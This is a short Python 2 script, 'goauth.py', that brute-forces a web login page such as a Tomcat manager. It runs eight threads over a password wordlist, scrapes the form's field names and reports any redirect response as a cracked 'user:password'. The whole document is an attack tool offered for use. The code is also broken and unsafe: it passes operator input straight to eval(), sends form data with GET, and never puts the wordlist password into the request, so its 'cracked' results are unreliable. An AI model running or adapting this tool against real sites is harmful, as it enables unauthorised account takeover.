#!/usr/bin/env python
# encoding:utf8
import requests
import Queue
from threading import Thread
from bs4 import BeautifulSoup
import sys

__author__ = 'whois'
__date__ = '2016/5/24'

user_list = ['admin']

if len(sys.argv) < 2:
    print "----------------burst auth---------------"
    print "[*] {0} url dict_file".format(sys.argv[0])
    print "Ex:"
    print "python goauth.py http://xxx.com/manager/html"
    exit(0)

url = sys.argv[1]
default_file = 'E:\Tools\PassList\Passwords\\top100pass.txt'

dict_file = sys.argv[2] if len(sys.argv) == 3 else default_file

payload = ''
queue = Queue.Queue()

with open(dict_file,'r') as f:
    for line in f.readlines():
        queue.put(line.rstrip())

def get_form():
    r = requests.get(url)
    html = BeautifulSoup(r.content, 'lxml')
    len_form = len(html.find_all("form"))
    for i in range(int(len_form)):
        #name_form = html.find_all("form")[i]['name'] if html.find_all("form")[i].has_attr('name') else "None"
        len_input = len(html.find_all("form")[i].find_all("input"))
        for a in range(int(len_input)):
            try:
                name_input = html.find_all("form")[i].find_all("input")[a]['name']
                print name_input  
            except:
                pass
    global payload
    print "user=user,pass=password,v='1234'"
    payload = raw_input("post data>>>")


def do(password):
    for user in user_list:
        
        try:
            r = requests.get(url, data=eval('dict(%s)' % payload))
            print eval('dict(%s)' % payload)
        except:
            print "[-] url is error!"
            exit(1)
        #print "cracking {0}:{1} ".format(user,password)
        sys.stdout.write('\r{0} '.format(password))
        if r.status_code == 302:
            print "[+] auth--> {0}:{1}".format(user,password)
           # exit(0)

def scan():
    while not queue.empty():
        do(queue.get())

def main():
    threads_list = []
    threads = 8

    get_form()
    
    for i in range(threads):
        t = Thread(target=scan)
        t.start()
        threads_list.append(t)

    for i in range(threads):
        threads_list[i].join()

if __name__ == '__main__':
    main()
